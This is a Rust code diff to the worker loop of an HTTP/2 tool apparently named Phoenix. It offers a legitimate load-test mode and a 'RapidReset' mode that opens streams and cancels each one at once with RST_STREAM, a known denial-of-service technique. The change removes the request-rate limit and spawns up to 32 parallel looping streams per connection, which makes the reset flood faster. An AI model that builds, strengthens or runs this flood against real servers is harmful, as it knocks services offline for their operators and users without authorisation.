@@ -259,77 +259,103 @@ async fn worker(
     // SendRequest is Clone — clone per iteration to avoid move
     let mut send = send;
 
-    let start    = Instant::now();
-    let interval = rps.map(|r| {
-        Duration::from_secs_f64(1.0 / ((r as f64) / (1_f64.max(1.0))).max(0.001))
-    });
-    let (mut ok, mut err) = (0u64, 0u64);
+    let start = Instant::now();
+    // Concurrent streams per connection — HTTP/2 multiplexing
+    // Use min(caps.max_concurrent_streams, 32) parallel streams per conn
+    let concurrency = caps.max_concurrent_streams.min(32) as usize;
 
-    while start.elapsed() < duration {
-        let req = Request::builder()
-            .version(Version::HTTP_2)
-            .method("GET")
-            .uri(&uri)
-            .header("user-agent", "Phoenix/1.0")
-            .body(())
-            .map_err(|e| e.to_string())?;
+    // Shared counters
+    let ok  = Arc::new(std::sync::atomic::AtomicU64::new(0));
+    let err = Arc::new(std::sync::atomic::AtomicU64::new(0));
 
-        let t0 = Instant::now();
+    // Spawn `concurrency` stream workers, each loops independently
+    let mut stream_handles = Vec::new();
+    for stream_id in 0..concurrency {
+        let uri     = uri.clone();
+        let mode    = mode.clone();
+        let metrics = metrics.clone();
+        let ok_c    = ok.clone();
+        let err_c   = err.clone();
+        let mut send = send.clone();
 
-        // ready() consumes send and gives it back — reassign each iteration
-        send = match send.ready().await {
-            Ok(s)  => s,
-            Err(e) => { error!("conn {} ready: {}", id, e); err += 1; break; }
-        };
+        let handle = tokio::spawn(async move {
+            while start.elapsed() < duration {
+                let req = match Request::builder()
+                    .version(Version::HTTP_2)
+                    .method("GET")
+                    .uri(&uri)
+                    .header("user-agent", "Phoenix/1.0")
+                    .body(())
+                {
+                    Ok(r)  => r,
+                    Err(e) => { error!("req build: {}", e); break; }
+                };
 
-        match mode {
-            // ── Legitimate load test — send request, read full response ──────
-            UniversalMode::LoadTest => {
-                match send.send_request(req, true) {
-                    Err(e) => { error!("conn {} send: {}", id, e); err += 1; }
-                    Ok((resp_f, _)) => {
-                        match resp_f.await {
-                            Err(e) => { error!("conn {} resp: {}", id, e); err += 1; }
-                            Ok(resp) => {
-                                let status  = resp.status().as_u16();
-                                let success = status < 400;
-                                // Drain body — releases flow control window
-                                let mut body = resp.into_body();
-                                while let Some(chunk) = body.data().await {
-                                    if let Ok(data) = chunk {
-                                        let _ = body.flow_control().release_capacity(data.len());
+                let t0 = Instant::now();
+
+                send = match send.ready().await {
+                    Ok(s)  => s,
+                    Err(e) => { debug!("stream {} ready err: {}", stream_id, e); break; }
+                };
+
+                match mode {
+                    UniversalMode::LoadTest => {
+                        match send.send_request(req, true) {
+                            Err(e) => {
+                                debug!("stream {} send err: {}", stream_id, e);
+                                err_c.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+                            }
+                            Ok((resp_f, _)) => {
+                                match resp_f.await {
+                                    Err(_) => {
+                                        err_c.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+                                    }
+                                    Ok(resp) => {
+                                        let status  = resp.status().as_u16();
+                                        let success = status < 400;
+                                        // Drain body — critical for flow control
+                                        let mut body = resp.into_body();
+                                        while let Some(chunk) = body.data().await {
+                                            if let Ok(data) = chunk {
+                                                let _ = body.flow_control().release_capacity(data.len());
+                                            }
+                                        }
+                                        let lat = t0.elapsed().as_micros() as u64;
+                                        metrics.record_request(lat, success, 0).await;
+                                        if success {
+                                            ok_c.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+                                        } else {
+                                            err_c.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+                                        }
                                     }
                                 }
-                                let lat = t0.elapsed().as_micros() as u64;
-                                metrics.record_request(lat, success, 0).await;
-                                if success { ok += 1; } else { err += 1; }
+                            }
+                        }
+                    }
+                    UniversalMode::RapidReset => {
+                        match send.send_request(req, false) {
+                            Err(e) => {
+                                debug!("stream {} RST err: {}", stream_id, e);
+                                err_c.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
+                            }
+                            Ok((resp_f, mut body)) => {
+                                body.send_reset(h2::Reason::CANCEL);
+                                drop(resp_f);
+                                metrics.record_request(0, true, 0).await;
+                                ok_c.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                             }
                         }
                     }
                 }
             }
-
-            // ── Rapid Reset — HEADERS + immediate RST_STREAM ─────────────────
-            UniversalMode::RapidReset => {
-                match send.send_request(req, false) {
-                    Err(e) => { debug!("conn {} RST send: {}", id, e); err += 1; }
-                    Ok((resp_f, mut body)) => {
-                        body.send_reset(h2::Reason::CANCEL);
-                        drop(resp_f);
-                        metrics.record_request(0, true, 0).await;
-                        ok += 1;
-                    }
-                }
-            }
-        }
-
-        if let Some(iv) = interval {
-            tokio::time::sleep(iv).await;
-        } else if ok % 200 == 0 {
-            tokio::task::yield_now().await;
-        }
+        });
+        stream_handles.push(handle);
     }
 
+    for h in stream_handles { let _ = h.await; }
+
+    let ok  = ok.load(std::sync::atomic::Ordering::Relaxed);
+    let err = err.load(std::sync::atomic::Ordering::Relaxed);
     debug!("conn {} done: {} ok {} err", id, ok, err);
     Ok((ok, err))
 }
